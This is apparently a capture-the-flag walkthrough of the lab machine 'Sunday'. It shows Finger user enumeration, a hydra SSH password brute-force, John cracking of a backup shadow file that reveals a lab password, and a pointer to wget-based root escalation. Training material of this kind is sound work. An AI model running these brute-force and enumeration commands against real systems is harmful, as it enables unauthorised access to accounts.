# About
Sunday is a fairly simple machine, however it uses fairly old software and can be a bit unpredictable at times. It mainly focuses on exploiting the Finger service as well as the use of weak credentials. 

# Enumeration

```
nmap 10.129.63.191 -p- -sV -sC --open
```

```
PORT      STATE    SERVICE        VERSION
20/tcp    filtered ftp-data
79/tcp    open     finger?
|_finger: No one logged on\x0D
| fingerprint-strings: 
|   GenericLines: 
|     No one logged on
|   GetRequest: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|   HTTPOptions: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|     OPTIONS ???
|   Help: 
|     Login Name TTY Idle When Where
|     HELP ???
|   RTSPRequest: 
|     Login Name TTY Idle When Where
|     OPTIONS ???
|     RTSP/1.0 ???
|   SSLSessionReq, TerminalServerCookie: 
|_    Login Name TTY Idle When Where

111/tcp   open  rpcbind 2-4 (RPC #100000)
515/tcp   open  printer
6787/tcp  open  http    Apache httpd
|_http-title: 400 Bad Request
|_http-server-header: Apache
22022/tcp open  ssh     OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:00:94:32:18:60:a4:93:3b:87:a4:b6:f8:02:68:0e (RSA)
|_  256 da:2a:6c:fa:6b:b1:ea:16:1d:a6:54:a1:0b:2b:ee:48 (ED25519)
```

## Finger Service

Find a Enum Tool [Here](https://github.com/pentestmonkey/finger-user-enum/blob/master/finger-user-enum.pl)

```
./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.129.63.191
```

We get the following users

```
sammy@10.129.63.191: sammy           ???            ssh          <Apr 13, 2022> 10.10.14.13         ..
sunny@10.129.63.191: sunny           ???            ssh          <Apr 13, 2022> 10.10.14.13         ..
```

## SSH

Knowing we have some users, I am going to send a basic password attack on SSH to check for weak credentials

![](Images/Pasted%20image%2020250502125033.png)

```
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -u -f ssh://10.129.63.191:22022 -t 4
```

After a while we get a successful SSH authentication

![](Images/Pasted%20image%2020250502125603.png)

We can use that to establish our connection to proceed further. After getting logged in I went to the root directory and noticed a nontypical directory /backups.

![](Images/Pasted%20image%2020250502130131.png)

Attempt to brute force the shadow.backup file using John.

```
john shadow.backup --wordlist=/usr/share/wordlists/rockyou.txt
```

We get a new user password `sammy:cooldude!`

![](Images/Pasted%20image%2020250502130346.png)

Login with sammy and grab the user flag.

![](Images/Pasted%20image%2020250502130429.png)

Sammy can run wget as root

![](Images/Pasted%20image%2020250502130518.png)

[Wget GTFO](https://gtfobins.github.io/gtfobins/wget/)

![](Images/Pasted%20image%2020250502130654.png)

Grab the root flag.


